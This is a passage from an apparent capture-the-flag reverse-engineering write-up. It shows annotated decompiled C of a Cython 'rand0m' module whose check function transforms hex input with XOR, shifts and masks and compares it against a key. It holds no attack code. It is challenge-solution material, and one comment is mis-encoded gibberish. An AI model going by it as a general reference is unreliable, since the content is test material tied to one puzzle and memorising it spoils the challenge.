class="line">    &#123;</span><br><span class="line">      v23 = k-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(k);</span><br><span class="line">    &#125;</span><br><span class="line">    IsTrue = midd == (Py_obj *)Py_TrueStruct;</span><br><span class="line">    <span class="keyword">if</span> ( !(IsTrue | (midd == (Py_obj *)Py_FalseStruct || midd == Py_NoneStruct)) )</span><br><span class="line">      IsTrue = PyObject_IsTrue(midd);</span><br><span class="line">    <span class="keyword">if</span> ( IsTrue &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">18</span>;</span><br><span class="line">      v8 = <span class="number">2985</span>;</span><br><span class="line">      v4 = i;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_218;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(midd-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = midd-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(midd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !IsTrue )</span><br><span class="line">      <span class="keyword">goto</span> neq_k;</span><br><span class="line">    midd = Get_Item(v50, <span class="number">0LL</span>);                  <span class="comment">// r1 = res[0]</span></span><br><span class="line">    <span class="keyword">if</span> ( !midd )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">18</span>;</span><br><span class="line">      v8 = <span class="number">2992</span>;</span><br><span class="line">      v4 = i;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_223;</span><br><span class="line">    &#125;</span><br><span class="line">    v58 = table;</span><br><span class="line">    v59 = (Py_obj *)i-&gt;type;</span><br><span class="line">    <span class="keyword">if</span> ( v59 != PyLong_Type )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v59 == (Py_obj *)PyFloat_Type )</span><br><span class="line">        v62 = PyFloat_FromDouble(v57);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v62 = PyNumber_Multiply(table[<span class="number">31</span>], i);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_144;</span><br><span class="line">    &#125;</span><br><span class="line">    v60 = i-&gt;size;</span><br><span class="line">    <span class="keyword">if</span> ( (v60 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v60 &gt;= <span class="number">0x10</span> )</span><br><span class="line">        v62 = (Py_obj *)(*(__int64 (__fastcall **)(Py_obj *, Py_obj *))(*((_QWORD *)&amp;PyLong_Type + <span class="number">12</span>) + <span class="number">16LL</span>))(</span><br><span class="line">                          table[<span class="number">31</span>],</span><br><span class="line">                          i);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v62 = PyLong_FromLongLong((Py_obj *)(<span class="number">2LL</span> * (<span class="type">int</span>)(LODWORD(i-&gt;item) * (<span class="number">1</span> - (v60 &amp; <span class="number">3</span>)))));</span><br><span class="line">LABEL_144:</span><br><span class="line">      v61 = v62;</span><br><span class="line">      k = v62;</span><br><span class="line">      <span class="keyword">if</span> ( !v62 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = <span class="number">18</span>;</span><br><span class="line">        v8 = <span class="number">2994</span>;</span><br><span class="line">        v4 = i;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_218;</span><br><span class="line">      &#125;</span><br><span class="line">      v58 = table;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_146;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( LODWORD(i-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">      ++LODWORD(i-&gt;refcnt);</span><br><span class="line">    v61 = i;</span><br><span class="line">    k = i;</span><br><span class="line">LABEL_146:</span><br><span class="line">    j_slice = Add(v61, v58[<span class="number">30</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( !j_slice )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">18</span>;</span><br><span class="line">      v8 = <span class="number">2996</span>;</span><br><span class="line">LABEL_209:</span><br><span class="line">      v4 = i;</span><br><span class="line">      <span class="keyword">if</span> ( SLODWORD(k-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v23 = k-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v23 )</span><br><span class="line">          Py_Dealloc(k);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !j_slice )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_216;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_213;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(v61-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = v61-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(v61);</span><br><span class="line">    &#125;</span><br><span class="line">    k = Get_Item_list(key, j_slice);            <span class="comment">// k = key[2 * i + 1]</span></span><br><span class="line">    <span class="keyword">if</span> ( !k )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">18</span>;</span><br><span class="line">      v8 = <span class="number">2999</span>;</span><br><span class="line">      v4 = i;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_213;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(j_slice-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = j_slice-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(j_slice);</span><br><span class="line">    &#125;</span><br><span class="line">    j_slice = PyObject_RichCompare(midd, k, <span class="number">2LL</span>);<span class="comment">// if res[0] == k:</span></span><br><span class="line">    <span class="keyword">if</span> ( !j_slice )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">18</span>;</span><br><span class="line">      v8 = <span class="number">3002</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_209;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(midd-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = midd-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(midd);</span><br><span class="line">    &#125;</span><br><span class="line">    midd = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(k-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = k-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(k);</span><br><span class="line">    &#125;</span><br><span class="line">    IsTrue_ = j_slice == (Py_obj *)Py_TrueStruct;</span><br><span class="line">    <span class="keyword">if</span> ( !(IsTrue_ | (j_slice == (Py_obj *)Py_FalseStruct || j_slice == Py_NoneStruct)) )</span><br><span class="line">      IsTrue_ = PyObject_IsTrue(j_slice);</span><br><span class="line">    <span class="keyword">if</span> ( IsTrue_ &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">18</span>;</span><br><span class="line">      v8 = <span class="number">3005</span>;</span><br><span class="line">      v4 = i;</span><br><span class="line">LABEL_213:</span><br><span class="line">      <span class="keyword">if</span> ( SLODWORD(j_slice-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v23 = j_slice-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v23 )</span><br><span class="line">          Py_Dealloc(j_slice);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_216;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(j_slice-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = j_slice-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(j_slice);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( IsTrue_ )</span><br><span class="line">    &#123;</span><br><span class="line">      v64 = Add(v19, table[<span class="number">30</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( !v64 )                               <span class="comment">// count += 1</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = <span class="number">19</span>;</span><br><span class="line">        v8 = <span class="number">3018</span>;</span><br><span class="line">        v4 = i;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_223;</span><br><span class="line">      &#125;</span><br><span class="line">      v65 = v19;</span><br><span class="line">      v77 = v64;</span><br><span class="line">      v19 = v64;</span><br><span class="line">      <span class="keyword">if</span> ( SLODWORD(v65-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v23 = v65-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v23 )</span><br><span class="line">          Py_Dealloc(v65);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">neq_k:                                          <span class="comment">// else:</span></span><br><span class="line">    midd = <span class="number">0LL</span>;</span><br><span class="line">    c4 = tmp1 + <span class="number">1</span>;</span><br><span class="line">    v4 = i;</span><br><span class="line">    tmp1 = c4;</span><br><span class="line">    <span class="keyword">if</span> ( c4 &gt;= <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 = usr_input;</span><br><span class="line">  &#125;</span><br><span class="line">  v66 = table[<span class="number">32</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v19 == v66 )</span><br><span class="line">  &#123;</span><br><span class="line">    v67 = (Py_obj *)Py_TrueStruct;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v68 = (Py_obj *)v19-&gt;type;</span><br><span class="line">    <span class="keyword">if</span> ( v68 == PyLong_Type )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (v19-&gt;size &amp; <span class="number">2</span>) == <span class="number">0</span> &amp;&amp; v19-&gt;size &gt;&gt; <span class="number">3</span> == <span class="number">1LL</span> &amp;&amp; LODWORD(v19-&gt;item) == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v67 = (Py_obj *)Py_TrueStruct;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_193;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v68 != (Py_obj *)PyFloat_Type )</span><br><span class="line">      &#123;</span><br><span class="line">        v67 = PyObject_RichCompare(v19, v66, <span class="number">2LL</span>);<span class="comment">// æœ€åä¸€æ¬¡æ¯”è¾ƒ</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_193;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">double</span> *)&amp;v19-&gt;size == <span class="number">4.0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v67 = (Py_obj *)Py_TrueStruct;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_193;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v67 = (Py_obj *)Py_FalseStruct;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_193:</span><br><span class="line">  v5 = v76;</span><br><span class="line">  <span class="keyword">if</span> ( v67 )</span><br><span class="line">  &#123;</span><br><span class="line">    v69 = key;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_226;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = <span class="number">20</span>;</span><br><span class="line">  v77 = v19;</span><br><span class="line">  v8 = <span class="number">3040</span>;</span><br><span class="line">LABEL_217:</span><br><span class="line">  <span class="keyword">if</span> ( !midd )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_224;</span><br><span class="line">LABEL_218:</span><br><span class="line">  <span class="keyword">if</span> ( SLODWORD(midd-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v23 = midd-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v23 )</span><br><span class="line">      Py_Dealloc(midd);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_223:</span><br><span class="line">  v5 = v76;</span><br><span class="line">LABEL_224:</span><br><span class="line">  v3 = v77;</span><br><span class="line">LABEL_225:</span><br><span class="line">  sub_7FFDD0C86240(<span class="string">&quot;rand0m.check&quot;</span>, v8, v7, (__int64)<span class="string">&quot;rand0m.pyx&quot;</span>);</span><br><span class="line">  v69 = key;</span><br><span class="line">  v19 = v3;</span><br><span class="line">  v50 = v72;</span><br><span class="line">  v67 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( key )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_226:</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(v69-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = v69-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(v69);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v19 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(v19-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = v19-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(v19);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(v4-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = v4-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(v4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(v5-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = v5-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(v5);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v50 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(v50-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = v50-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(v50);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v67;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Py_obj *__fastcall <span class="title function_">rand0m_rand0m</span><span class="params">(__int64 a1, Py_obj *slice)</span></span><br><span class="line">&#123;</span><br><span class="line">  Py_obj *v2; <span class="comment">// r13</span></span><br><span class="line">  Py_obj *p1; <span class="comment">// r14</span></span><br><span class="line">  Py_obj *v5; <span class="comment">// rdi</span></span><br><span class="line">  Py_obj *xnum; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// r15d</span></span><br><span class="line">  Py_obj *v_tuple; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// ebp</span></span><br><span class="line">  Py_obj **v10; <span class="comment">// rdx</span></span><br><span class="line">  Py_obj *v11; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *num; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">bool</span> v13; <span class="comment">// zf</span></span><br><span class="line">  Py_obj *v14; <span class="comment">// rax</span></span><br><span class="line">  Py_obj *rnum; <span class="comment">// rax</span></span><br><span class="line">  Py_obj **v16; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 size; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v18; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *v19; <span class="comment">// rax</span></span><br><span class="line">  Py_obj *p2; <span class="comment">// rbp</span></span><br><span class="line">  Py_obj *v21; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *tmp1; <span class="comment">// rax</span></span><br><span class="line">  Py_obj *tmp2; <span class="comment">// rsi</span></span><br><span class="line">  Py_obj *v24; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *v25; <span class="comment">// rax</span></span><br><span class="line">  Py_obj *_xnum; <span class="comment">// rbx</span></span><br><span class="line">  Py_obj *v27; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *pw; <span class="comment">// rax</span></span><br><span class="line">  Py_obj *p3; <span class="comment">// rsi</span></span><br><span class="line">  Py_obj *nv_tuple; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  p1 = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  xnum = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">2</span>;</span><br><span class="line">  v_tuple = PyTuple_New(<span class="number">2LL</span>);                   <span class="comment">// v = (None, None)</span></span><br><span class="line">  <span class="keyword">if</span> ( !v_tuple )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">2594</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_77;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(slice-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">    ++LODWORD(slice-&gt;refcnt);</span><br><span class="line">  v10 = table;</span><br><span class="line">  v_tuple-&gt;item = slice;                        <span class="comment">// v[0] = slice</span></span><br><span class="line">  v11 = v10[<span class="number">36</span>];</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(v11-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">    ++LODWORD(v11-&gt;refcnt);</span><br><span class="line">  v_tuple[<span class="number">1</span>].refcnt = v10[<span class="number">36</span>];                  <span class="comment">// v[1] = 0x10</span></span><br><span class="line">  num = sub_7FFDD0C842B0(PyLong_Type, v_tuple); <span class="comment">// num = int(slice, 0x10)</span></span><br><span class="line">  <span class="keyword">if</span> ( !num )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">2602</span>;</span><br><span class="line">LABEL_48:</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(v_tuple-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = v_tuple-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v13 )</span><br><span class="line">LABEL_50:</span><br><span class="line">        Py_Dealloc(v_tuple);</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_77:</span><br><span class="line">    sub_7FFDD0C86240(<span class="string">&quot;rand0m.rand0m&quot;</span>, v9, v7, (__int64)<span class="string">&quot;rand0m.pyx&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_87;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_84;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( SLODWORD(v_tuple-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = v_tuple-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">      Py_Dealloc(v_tuple);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = num;</span><br><span class="line">  v14 = (Py_obj *)PyNumber_Xor(num, table[<span class="number">44</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !v14 )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">2615</span>;</span><br><span class="line">    v7 = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_77;</span><br><span class="line">  &#125;</span><br><span class="line">  xnum = v14;                                   <span class="comment">// xnum = num ^ 0x9e3779b9</span></span><br><span class="line">  rnum = Rshift(num, table[<span class="number">0x21</span>], <span class="number">5</span>, <span class="number">0</span>);        <span class="comment">// rnum = num &gt;&gt; 5</span></span><br><span class="line">  <span class="keyword">if</span> ( !rnum )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">2627</span>;</span><br><span class="line">    v7 = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_77;</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = table;</span><br><span class="line">  p1 = rnum;</span><br><span class="line">  <span class="keyword">if</span> ( (Py_obj *<span class="type">const</span>)num-&gt;type != PyLong_Type )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">  size = num-&gt;size;</span><br><span class="line">  <span class="keyword">if</span> ( (size &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( LODWORD(num-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">      ++LODWORD(num-&gt;refcnt);</span><br><span class="line">    v_tuple = num;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( size &gt;= <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( (size &gt;&gt; <span class="number">3</span>) * (<span class="number">1</span> - (num-&gt;size &amp; <span class="number">3LL</span>)) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xFFFFFFFFFFFFFFFE</span>uLL:</span><br><span class="line">        v18 = -(__int64)(LODWORD(num-&gt;item) | ((<span class="type">unsigned</span> __int64)HIDWORD(num-&gt;item) &lt;&lt; <span class="number">30</span>));</span><br><span class="line">        <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">        v18 = LODWORD(num-&gt;item) | ((<span class="type">unsigned</span> __int64)HIDWORD(num-&gt;item) &lt;&lt; <span class="number">30</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        v19 = (Py_obj *)(*(__int64 (__fastcall **)(Py_obj *, Py_obj *))(*((_QWORD *)&amp;PyLong_Type + <span class="number">12</span>) + <span class="number">88LL</span>))(</span><br><span class="line">                          num,</span><br><span class="line">                          table[<span class="number">32</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">  &#125;</span><br><span class="line">  LODWORD(v18) = LODWORD(num-&gt;item) * (<span class="number">1</span> - (size &amp; <span class="number">3</span>));</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)v18 != (<span class="number">16</span> * (<span class="type">int</span>)v18) &gt;&gt; <span class="number">4</span> &amp;&amp; (_DWORD)v18 )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = (<span class="type">int</span>)v18;</span><br><span class="line">LABEL_29:</span><br><span class="line">    <span class="keyword">if</span> ( v18 == (__int64)(<span class="number">0x10</span> * v18) &gt;&gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v19 = PyLong_FromLongLong((Py_obj *)(<span class="number">0x10</span> * v18));</span><br><span class="line">      <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_32:</span><br><span class="line">    v19 = (Py_obj *)PyNumber_Lshift(num, table[<span class="number">32</span>]);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">  &#125;</span><br><span class="line">  v19 = PyLong_FromLong((<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">16</span> * v18));</span><br><span class="line">LABEL_33:</span><br><span class="line">  num = v19;</span><br><span class="line">  v_tuple = v19;</span><br><span class="line">  <span class="keyword">if</span> ( !v19 )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">2639</span>;</span><br><span class="line">    v7 = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_77;</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = table;</span><br><span class="line">LABEL_36:</span><br><span class="line">  p2 = PyNumber_And(num, v16[<span class="number">48</span>]);              <span class="comment">// p2 = (num &lt;&lt; 4) &amp; 0xfa3affff</span></span><br><span class="line">  <span class="keyword">if</span> ( !p2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">2641</span>;</span><br><span class="line">    v7 = <span class="number">5</span>;</span><br><span class="line">LABEL_66:</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(v_tuple-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = v_tuple-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v13 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_77;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( SLODWORD(num-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = num-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">      Py_Dealloc(num);</span><br><span class="line">  &#125;</span><br><span class="line">  v21 = v5;</span><br><span class="line">  v5 = p2;</span><br><span class="line">  <span class="keyword">if</span> ( SLODWORD(v21-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = v21-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">      Py_Dealloc(v21);</span><br><span class="line">  &#125;</span><br><span class="line">  tmp1 = Rshift(p1, table[<span class="number">37</span>], <span class="number">0x17</span>, <span class="number">0</span>);        <span class="comment">// (tmp1 = rnum &gt;&gt; 0x17)</span></span><br><span class="line">  v_tuple = tmp1;</span><br><span class="line">  <span class="keyword">if</span> ( !tmp1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">2654</span>;</span><br><span class="line">    v7 = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_77;</span><br><span class="line">  &#125;</span><br><span class="line">  tmp2 = PyNumber_Add(p2, tmp1);                <span class="comment">// (tmp2 = tmp1 + p2)</span></span><br><span class="line">  <span class="keyword">if</span> ( !tmp2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">2656</span>;</span><br><span class="line">    v7 = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_48;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( SLODWORD(v_tuple-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = v_tuple-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">      Py_Dealloc(v_tuple);</span><br><span class="line">  &#125;</span><br><span class="line">  v24 = p1;</span><br><span class="line">  p1 = tmp2;                                    <span class="comment">// p1 = tmp2</span></span><br><span class="line">  <span class="keyword">if</span> ( SLODWORD(v24-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = v24-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">      Py_Dealloc(v24);</span><br><span class="line">  &#125;</span><br><span class="line">  v25 = Rshift(xnum, table[<span class="number">35</span>], <span class="number">0xB</span>, <span class="number">1</span>);</span><br><span class="line">  _xnum = v25;</span><br><span class="line">  <span class="keyword">if</span> ( !v25 )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">2669</span>;</span><br><span class="line">    v7 = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_77;</span><br><span class="line">  &#125;</span><br><span class="line">  v27 = xnum;</span><br><span class="line">  xnum = v25;                                   <span class="comment">// xnum 